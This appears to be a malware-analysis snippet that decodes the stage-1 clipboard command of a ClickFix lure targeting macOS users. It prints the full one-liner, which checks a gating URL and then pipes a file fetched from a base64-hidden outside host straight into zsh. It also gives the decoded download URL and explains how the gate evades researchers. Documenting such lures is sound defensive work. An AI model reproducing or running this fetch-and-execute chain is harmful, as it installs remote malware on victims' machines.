# Stage 1: the one-liner a ClickFix page writes to the clipboard, decoded.
# The gate token is single-use and has been redacted.

_xr=$(curl -s 'http://fingerprint-verification.info/p/<TOKEN>')
if [ "$_xr" = "ok" ]; then
  curl -s $(echo "aHR0cHM6Ly9zaGVsdGVybm9kZTE4LmNvbS9jdXJsL3F1dHRyZW1qOHNyOC9rcHN2Zm90aTdlNnNtYTJ5czNsLmRhdA==" | openssl base64 -d -A) | zsh
fi

# The base64 decodes to:
#   https://shelternode18.com/curl/quttremj8sr8/kpsvfoti7e6sma2ys3l.dat
#
# The gate returns "ok" only once per token and only to a macOS user agent from a
# non-datacentre address; afterwards it serves benign content.
